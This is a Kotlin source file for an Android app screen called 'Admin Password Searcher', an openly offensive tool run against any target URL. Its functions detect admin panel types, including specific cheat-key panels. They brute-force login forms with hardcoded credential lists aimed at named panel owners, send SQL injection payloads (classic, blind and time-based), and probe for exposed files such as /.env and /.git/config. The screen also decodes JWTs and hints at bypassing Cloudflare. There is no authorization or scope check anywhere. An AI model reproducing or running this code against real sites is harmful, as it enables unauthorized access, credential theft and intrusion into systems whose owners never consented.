package com.oprek.tool.ui.screens

import androidx.compose.foundation.background
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.foundation.lazy.rememberLazyListState
import androidx.compose.foundation.shape.RoundedCornerShape
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.draw.clip
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.text.font.FontFamily
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.ui.unit.sp
import com.oprek.tool.ui.theme.*
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.io.BufferedReader
import java.io.InputStreamReader
import java.io.PrintWriter
import java.net.HttpURLConnection
import java.net.URL
import java.net.URLEncoder
import java.util.Base64

data class ScanResult(
    val timestamp: String = java.text.SimpleDateFormat("HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date()),
    val type: String = "INFO",
    val message: String
)

@OptIn(ExperimentalMaterial3Api::class)
@Composable
fun AdminPasswordSearcherScreen(navController: androidx.navigation.NavController) {
    var targetUrl by remember { mutableStateOf("") }
    var isScanning by remember { mutableStateOf(false) }
    var scanResults by remember { mutableStateOf(listOf<ScanResult>()) }
    var selectedMode by remember { mutableStateOf(0) }
    val scope = rememberCoroutineScope()
    val lazyListState = rememberLazyListState()

    val modes = listOf("🔍 Panel Detect", "🔑 Brute Force", "💉 SQLi Test", "🌐 API Enum", "📜 JWT Analyze", "🎯 Full Scan")

    fun addResult(type: String, message: String) {
        scanResults = scanResults + ScanResult(type = type, message = message)
    }

    fun clearResults() {
        scanResults = emptyList()
    }

    Scaffold(
        topBar = {
            TopAppBar(
                title = { Text("🔑 Admin Password Searcher", fontWeight = FontWeight.Bold) },
                navigationIcon = {
                    IconButton(onClick = { navController.popBackStack() }) {
                        Icon(Icons.Default.ArrowBack, "Back")
                    }
                },
                colors = TopAppBarDefaults.topAppBarColors(containerColor = DarkBg)
            )
        },
        containerColor = DarkBg
    ) { padding ->
        Column(
            Modifier
                .padding(padding)
                .fillMaxSize()
        ) {
            // URL Input
            Card(
                Modifier.fillMaxWidth().padding(12.dp),
                colors = CardDefaults.cardColors(containerColor = Color(0xFF1A1A2E)),
                shape = RoundedCornerShape(12.dp)
            ) {
                Column(Modifier.padding(16.dp)) {
                    Text("🎯 Target URL", fontWeight = FontWeight.Bold, color = AccentCyan)
                    Spacer(Modifier.height(8.dp))
                    OutlinedTextField(
                        value = targetUrl,
                        onValueChange = { targetUrl = it },
                        modifier = Modifier.fillMaxWidth(),
                        placeholder = { Text("https://example.com/admin", color = TextSecondary) },
                        singleLine = true,
                        colors = OutlinedTextFieldDefaults.colors(focusedTextColor = TextPrimary, unfocusedTextColor = TextPrimary)
                    )
                    Spacer(Modifier.height(8.dp))

                    // Mode selector
                    Text("Mode:", fontSize = 12.sp, color = TextSecondary)
                    Spacer(Modifier.height(4.dp))
                    Row(
                        Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.spacedBy(4.dp)
                    ) {
                        modes.forEachIndexed { idx, mode ->
                            FilterChip(
                                selected = selectedMode == idx,
                                onClick = { selectedMode = idx },
                                label = { Text(mode, fontSize = 10.sp) },
                                colors = FilterChipDefaults.filterChipColors(
                                    selectedContainerColor = AccentCyan.copy(alpha = 0.2f),
                                    selectedLabelColor = AccentCyan
                                )
                            )
                        }
                    }

                    Spacer(Modifier.height(12.dp))

                    // Action buttons
                    Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(8.dp)) {
                        Button(
                            onClick = {
                                if (targetUrl.isBlank()) return@Button
                                isScanning = true
                                clearResults()
                                scope.launch {
                                    when (selectedMode) {
                                        0 -> detectPanel(targetUrl, ::addResult)
                                        1 -> bruteForce(targetUrl, ::addResult)
                                        2 -> testSqlInjection(targetUrl, ::addResult)
                                        3 -> enumerateApi(targetUrl, ::addResult)
                                        4 -> analyzeJwt(targetUrl, ::addResult)
                                        5 -> {
                                            detectPanel(targetUrl, ::addResult)
                                            bruteForce(targetUrl, ::addResult)
                                            testSqlInjection(targetUrl, ::addResult)
                                            enumerateApi(targetUrl, ::addResult)
                                        }
                                    }
                                    isScanning = false
                                }
                            },
                            modifier = Modifier.weight(1f),
                            enabled = !isScanning && targetUrl.isNotBlank(),
                            colors = ButtonDefaults.buttonColors(containerColor = AccentCyan)
                        ) {
                            if (isScanning) {
                                CircularProgressIndicator(Modifier.size(16.dp), strokeWidth = 2.dp, color = Color.White)
                                Spacer(Modifier.width(8.dp))
                                Text("Scanning...")
                            } else {
                                Icon(Icons.Default.PlayArrow, null, Modifier.size(16.dp))
                                Spacer(Modifier.width(4.dp))
                                Text("Start ${modes[selectedMode].substringAfter(" ")}")
                            }
                        }
                        OutlinedButton(onClick = { clearResults() }) {
                            Icon(Icons.Default.Delete, null, Modifier.size(16.dp))
                        }
                    }
                }
            }

            // Results
            Card(
                Modifier
                    .fillMaxWidth()
                    .weight(1f)
                    .padding(12.dp),
                colors = CardDefaults.cardColors(containerColor = Color(0xFF1A1A2E)),
                shape = RoundedCornerShape(12.dp)
            ) {
                Column(Modifier.padding(12.dp)) {
                    Row(Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.SpaceBetween, verticalAlignment = Alignment.CenterVertically) {
                        Text("📋 Results (${scanResults.size})", fontWeight = FontWeight.Bold, color = AccentGreen)
                        Text("© Panxcz & Freebuff", fontSize = 10.sp, color = TextSecondary)
                    }
                    Spacer(Modifier.height(8.dp))

                    if (scanResults.isEmpty()) {
                        Box(Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                            Column(horizontalAlignment = Alignment.CenterHorizontally) {
                                Text("🔑", fontSize = 48.sp)
                                Spacer(Modifier.height(8.dp))
                                Text("Enter target URL and start scan", color = TextSecondary, fontSize = 13.sp)
                            }
                        }
                    } else {
                        LazyColumn(state = lazyListState) {
                            items(scanResults) { result ->
                                ScanResultItem(result)
                                Spacer(Modifier.height(4.dp))
                            }
                        }
                    }
                }
            }
        }
    }
}

@Composable
fun ScanResultItem(result: ScanResult) {
    val color = when (result.type) {
        "HIT" -> AccentGreen
        "WARN" -> AccentOrange
        "ERROR" -> AccentRed
        "INFO" -> AccentCyan
        "VULN" -> Color(0xFFFF1744)
        else -> TextSecondary
    }
    val icon = when (result.type) {
        "HIT" -> "✅"
        "WARN" -> "⚠️"
        "ERROR" -> "❌"
        "VULN" -> "🔓"
        else -> "ℹ️"
    }

    Card(
        Modifier.fillMaxWidth(),
        colors = CardDefaults.cardColors(containerColor = color.copy(alpha = 0.08f)),
        shape = RoundedCornerShape(8.dp)
    ) {
        Row(Modifier.padding(8.dp), verticalAlignment = Alignment.Top) {
            Text(icon, fontSize = 14.sp)
            Spacer(Modifier.width(8.dp))
            Column(Modifier.weight(1f)) {
                Text(result.type, fontSize = 10.sp, fontWeight = FontWeight.Bold, color = color)
                Text(result.message, fontSize = 12.sp, color = TextPrimary, fontFamily = FontFamily.Monospace)
            }
            Text(result.timestamp, fontSize = 9.sp, color = TextSecondary)
        }
    }
}

// === SCAN FUNCTIONS ===

private suspend fun detectPanel(url: String, addResult: (String, String) -> Unit) = withContext(Dispatchers.IO) {
    addResult("INFO", "🔍 Detecting panel type at: $url")
    try {
        val conn = URL(url).openConnection() as HttpURLConnection
        conn.requestMethod = "GET"
        conn.connectTimeout = 10000
        conn.readTimeout = 10000
        conn.setRequestProperty("User-Agent", "Mozilla/5.0")

        val code = conn.responseCode
        val headers = conn.headerFields
        val body = BufferedReader(InputStreamReader(conn.inputStream ?: conn.errorStream)).readText()
        conn.disconnect()

        addResult("INFO", "HTTP $code | Body: ${body.length} bytes")

        // Detect panel type
        val panelTypes = mapOf(
            "WilzXiterZ" to listOf("WilzXiterZ", "limzyyxit", "key control panel"),
            "CH3ATGPT Panel" to listOf("BUNRIEWDEV", "CH3ATGPT", "anhtainopro"),
            "WordPress" to listOf("wp-content", "wp-includes", "wordpress"),
            "cPanel" to listOf("cPanel", "WHM", "whostmgr"),
            "phpMyAdmin" to listOf("phpMyAdmin", "pma_"),
            "Laravel" to listOf("laravel", "csrf-token"),
            "Supabase" to listOf("supabase", "gotrue"),
            "Cloudflare" to listOf("cloudflare", "cf-ray", "One moment"),
            "AdminLTE" to listOf("AdminLTE", "adminlte"),
            "Django" to listOf("django", "csrfmiddleware"),
            "Express/Node" to listOf("Express", "X-Powered-By: Express"),
            "ASP.NET" to listOf("ASP.NET", "aspx"),
            "Joomla" to listOf("joomla", "com_content"),
            "Drupal" to listOf("drupal", "Drupal"),
            "Firebase" to listOf("firebase", "firebaseio.com"),
        )

        var detected = false
        for ((name, keywords) in panelTypes) {
            if (keywords.any { body.contains(it, true) }) {
                addResult("HIT", "Panel detected: $name")
                detected = true
            }
        }
        if (!detected) addResult("INFO", "Panel type: Unknown")

        // Detect server
        headers["Server"]?.firstOrNull()?.let { addResult("INFO", "Server: $it") }
        headers["X-Powered-By"]?.firstOrNull()?.let { addResult("INFO", "X-Powered-By: $it") }
        headers["cf-ray"]?.firstOrNull()?.let { addResult("WARN", "Cloudflare protection detected!") }

        // Check for Cloudflare challenge
        if (body.contains("One moment", true) || body.contains("challenge", true)) {
            addResult("WARN", "⚠️ Cloudflare challenge page - may need browser access")
        }

        // Check for login form
        if (body.contains("login", true) || body.contains("password", true)) {
            addResult("INFO", "Login form detected")
            // Extract form fields
            val inputs = Regex("""name=["']([^"']+)["']""", RegexOption.IGNORE_CASE).findAll(body)
                .map { it.groupValues[1] }.toList()
            addResult("INFO", "Form fields: ${inputs.joinToString(", ")}")
        }

        // Check for error messages
        val errorPatterns = listOf("error", "invalid", "failed", "salah", "gagal", "incorrect", "wrong")
        for (pat in errorPatterns) {
            if (body.contains(pat, true)) {
                addResult("INFO", "Error pattern found: '$pat' (may help enumerate users)")
                break
            }
        }

    } catch (e: Exception) {
        addResult("ERROR", "Connection failed: ${e.message}")
    }
}

private suspend fun bruteForce(url: String, addResult: (String, String) -> Unit) = withContext(Dispatchers.IO) {
    addResult("INFO", "🔑 Starting brute force attack")

    val commonUsers = listOf(
        "admin", "root", "administrator", "user", "test", "demo",
        "wilz", "WilzXiterZ", "owner", "superadmin",
        "BUNRIEWDEV", "bunriewdev", "AnhTaiNoPro", "developer",
        "manager", "operator", "support", "guest"
    )

    val commonPasswords = listOf(
        "admin", "password", "123456", "admin123", "password123",
        "root", "toor", "letmein", "qwerty", "12345678",
        "changeme", "default", "master", "secret", "pass",
        "test", "guest", "login", "abc123", "monkey",
        "dragon", "shadow", "sunshine", "trustno1", "iloveyou",
        "admin2024", "admin2025", "admin2026", "admin1234",
        "wilz123", "WilzXiterZ123", "wilzxiterz", "limzyy123",
        "BUNRIEWDEV123", "anhtaino", "ch3atgpt", "password1"
    )

    var found = false
    var attempts = 0

    for (user in commonUsers) {
        if (found) break
        for (pass in commonPasswords) {
            attempts++
            try {
                val conn = URL(url).openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.doOutput = true
                conn.connectTimeout = 8000
                conn.readTimeout = 8000
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
                conn.setRequestProperty("User-Agent", "Mozilla/5.0")

                val postData = "login_form=&login=${URLEncoder.encode(user, "UTF-8")}&password=${URLEncoder.encode(pass, "UTF-8")}"
                conn.outputStream.write(postData.toByteArray())

                val code = conn.responseCode
                val body = BufferedReader(InputStreamReader(conn.inputStream ?: conn.errorStream)).readText()
                conn.disconnect()

                // Check for success indicators
                val successIndicators = listOf("dashboard", "welcome", "panel", "admin", "berhasil", "logged", "success")
                val isDash = successIndicators.any { body.contains(it, true) }

                if (code == 301 || code == 302) {
                    addResult("HIT", "🎯 REDIRECT! $user:$pass (HTTP $code)")
                    found = true
                } else if (isDash && !body.contains("login", true)) {
                    addResult("HIT", "🎯 POSSIBLE HIT! $user:$pass (dashboard detected)")
                    found = true
                }

                if (attempts % 20 == 0) {
                    addResult("INFO", "Progress: $attempts attempts tested...")
                }

            } catch (e: Exception) {
                // Skip connection errors
            }
        }
    }

    if (!found) {
        addResult("WARN", "Brute force completed: $attempts attempts, no valid credentials found")
        addResult("INFO", "Tip: Try manual testing with targeted passwords")
    } else {
        addResult("HIT", "Credentials found after $attempts attempts!")
    }
}

private suspend fun testSqlInjection(url: String, addResult: (String, String) -> Unit) = withContext(Dispatchers.IO) {
    addResult("INFO", "💉 Testing SQL Injection vulnerabilities")

    val payloads = listOf(
        "' OR '1'='1",
        "' OR 1=1--",
        "' OR 1=1#",
        "admin'--",
        "' OR ''='",
        "1' OR '1'='1'#",
        "admin' OR '1'='1",
        "1' OR 1=1 LIMIT 1--",
        "' UNION SELECT NULL--",
        "admin'/**/OR/**/1=1--",
        "1' AND '1'='1",
        "') OR ('1'='1",
        "1' OR 'a'='a",
        "' OR 1=1 LIMIT 1-- -",
        "admin' AND 1=CONVERT(int,(SELECT @@version))--"
    )

    var vulnFound = false
    for (payload in payloads) {
        try {
            // Test in username field
            val conn = URL(url).openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.doOutput = true
            conn.connectTimeout = 8000
            conn.readTimeout = 8000
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
            conn.setRequestProperty("User-Agent", "Mozilla/5.0")

            val postData = "login=${URLEncoder.encode(payload, "UTF-8")}&password=anything"
            conn.outputStream.write(postData.toByteArray())

            val code = conn.responseCode
            val body = BufferedReader(InputStreamReader(conn.inputStream ?: conn.errorStream)).readText()
            conn.disconnect()

            if (code == 301 || code == 302) {
                addResult("VULN", "🔓 SQLi REDIRECT! Payload: $payload")
                vulnFound = true
            }

            // Check for SQL error messages
            val sqlErrors = listOf(
                "sql", "mysql", "sqlite", "postgresql", "oracle", "syntax error",
                "query failed", "database error", "unterminated", "warning: mysql",
                "You have an error", "SQL syntax", "ORA-"
            )
            for (err in sqlErrors) {
                if (body.contains(err, true)) {
                    addResult("VULN", "🔓 SQL ERROR detected with: $payload ($err)")
                    vulnFound = true
                }
            }
        } catch (e: Exception) {
            // Skip
        }
    }

    // Blind SQLi test
    if (!vulnFound) {
        addResult("INFO", "Testing blind SQLi...")
        val blindPayloads = listOf("1 AND 1=1", "1 AND 1=2")
        val baseBody = try {
            val conn = URL(url).openConnection() as HttpURLConnection
            conn.requestMethod = "POST"; conn.doOutput = true; conn.connectTimeout = 8000
            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
            conn.setRequestProperty("User-Agent", "Mozilla/5.0")
            conn.outputStream.write("login=admin&password=test".toByteArray())
            val b = BufferedReader(InputStreamReader(conn.inputStream ?: conn.errorStream)).readText()
            conn.disconnect(); b
        } catch (_: Exception) { "" }

        for (bp in blindPayloads) {
            try {
                val conn = URL(url).openConnection() as HttpURLConnection
                conn.requestMethod = "POST"; conn.doOutput = true; conn.connectTimeout = 8000
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
                conn.setRequestProperty("User-Agent", "Mozilla/5.0")
                conn.outputStream.write("login=${URLEncoder.encode(bp, "UTF-8")}&password=x".toByteArray())
                val body = BufferedReader(InputStreamReader(conn.inputStream ?: conn.errorStream)).readText()
                conn.disconnect()
                if (body == baseBody && bp.contains("1=1")) {
                    addResult("VULN", "Blind SQLi: $bp returns same response as normal")
                    vulnFound = true; break
                }
            } catch (_: Exception) {}
        }
    }

    // Time-based SQLi
    if (!vulnFound) {
        addResult("INFO", "Testing time-based blind SQLi...")
        val timePayloads = listOf("\' OR SLEEP(3)--", "\' OR pg_sleep(3)--")
        for (tp in timePayloads) {
            try {
                val start = System.currentTimeMillis()
                val conn = URL(url).openConnection() as HttpURLConnection
                conn.requestMethod = "POST"; conn.doOutput = true; conn.connectTimeout = 15000; conn.readTimeout = 15000
                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded")
                conn.setRequestProperty("User-Agent", "Mozilla/5.0")
                conn.outputStream.write("login=${URLEncoder.encode(tp, "UTF-8")}&password=x".toByteArray())
                conn.inputStream?.readBytes(); conn.disconnect()
                val elapsed = System.currentTimeMillis() - start
                if (elapsed > 2500) {
                    addResult("VULN", "Time-based SQLi: $tp (took ${elapsed}ms)")
                    vulnFound = true; break
                }
            } catch (_: Exception) {}
        }
    }

    // Cloudflare detection
    try {
        val conn = URL(url).openConnection() as HttpURLConnection
        conn.connectTimeout = 5000; conn.setRequestProperty("User-Agent", "Mozilla/5.0")
        val cf = conn.getHeaderField("cf-ray"); conn.disconnect()
        if (cf != null) addResult("WARN", "Cloudflare detected! Try origin IP or browser bypass")
    } catch (_: Exception) {}

    if (!vulnFound) {
        addResult("INFO", "No SQL injection found (parameterized queries or WAF)")
        addResult("INFO", "Tip: Try sqlmap or Burp Suite for deeper testing")
    }
}

private suspend fun enumerateApi(url: String, addResult: (String, String) -> Unit) = withContext(Dispatchers.IO) {
    addResult("INFO", "🌐 Enumerating API endpoints")

    val baseUrl = try {
        val u = URL(url)
        "${u.protocol}://${u.host}"
    } catch (e: Exception) { url }

    val endpoints = listOf(
        "/api", "/api/login", "/api/admin", "/api/users", "/api/keys",
        "/api/config", "/api/status", "/api/health", "/api/docs", "/api/v1",
        "/api/public", "/api/register", "/api/auth", "/admin", "/dashboard",
        "/panel", "/login", "/register", "/signup", "/graphql",
        "/.env", "/.git/config", "/robots.txt", "/sitemap.xml",
        "/config.php", "/database.php", "/wp-admin", "/phpmyadmin",
        "/.well-known/security.txt", "/server-status", "/server-info"
    )

    for (ep in endpoints) {
        try {
            val conn = URL("$baseUrl$ep").openConnection() as HttpURLConnection
            conn.requestMethod = "GET"
            conn.connectTimeout = 5000
            conn.readTimeout = 5000
            conn.setRequestProperty("User-Agent", "Mozilla/5.0")
            conn.instanceFollowRedirects = false

            val code = conn.responseCode
            conn.disconnect()

            when (code) {
                200 -> addResult("HIT", "✅ $ep → HTTP $code (accessible)")
                301, 302 -> addResult("INFO", "↗️ $ep → HTTP $code (redirect)")
                403 -> addResult("WARN", "🔒 $ep → HTTP $code (forbidden - exists but blocked)")
                401 -> addResult("INFO", "🔐 $ep → HTTP $code (auth required)")
                404 -> { /* skip */ }
                500 -> addResult("WARN", "💥 $ep → HTTP $code (server error)")
                else -> addResult("INFO", "$ep → HTTP $code")
            }
        } catch (e: Exception) {
            // skip
        }
    }

    addResult("INFO", "API enumeration complete")
}

private suspend fun analyzeJwt(url: String, addResult: (String, String) -> Unit) = withContext(Dispatchers.IO) {
    addResult("INFO", "📜 Analyzing JWT tokens at: $url")

    try {
        val conn = URL(url).openConnection() as HttpURLConnection
        conn.requestMethod = "GET"
        conn.connectTimeout = 10000
        conn.readTimeout = 10000
        conn.setRequestProperty("User-Agent", "Mozilla/5.0")

        val body = BufferedReader(InputStreamReader(conn.inputStream ?: conn.errorStream)).readText()
        conn.disconnect()

        // Find JWT tokens in response
        val jwtPattern = Regex("eyJ[a-zA-Z0-9_-]{50,500}")
        val tokens = jwtPattern.findAll(body).map { it.value }.distinct().toList()

        if (tokens.isEmpty()) {
            addResult("INFO", "No JWT tokens found in page source")
            addResult("INFO", "Try login first, then check response for tokens")
        } else {
            addResult("HIT", "Found ${tokens.size} JWT token(s)")
            for (token in tokens.take(3)) {
                addResult("INFO", "Token: ${token.take(80)}...")
                try {
                    val parts = token.split(".")
                    if (parts.size >= 2) {
                        val payload = parts[1]
                        val padded = payload + "=".repeat((4 - payload.length % 4) % 4)
                        val decoded = String(Base64.getUrlDecoder().decode(padded))
                        addResult("INFO", "Payload: ${decoded.take(200)}")

                        // Check for common claims
                        if (decoded.contains("admin", true)) addResult("HIT", "Admin claim detected!")
                        if (decoded.contains("role", true)) addResult("INFO", "Role-based auth")
                        if (decoded.contains("exp", true)) addResult("INFO", "Token has expiry")
                    }
                } catch (e: Exception) {
                    addResult("ERROR", "JWT decode failed: ${e.message}")
                }
            }
        }

        // Check cookies
        addResult("INFO", "Check browser DevTools → Application → Cookies for session tokens")
        addResult("INFO", "Check browser DevTools → Network → Response Headers for Authorization header")

    } catch (e: Exception) {
        addResult("ERROR", "Failed to fetch page: ${e.message}")
    }
}
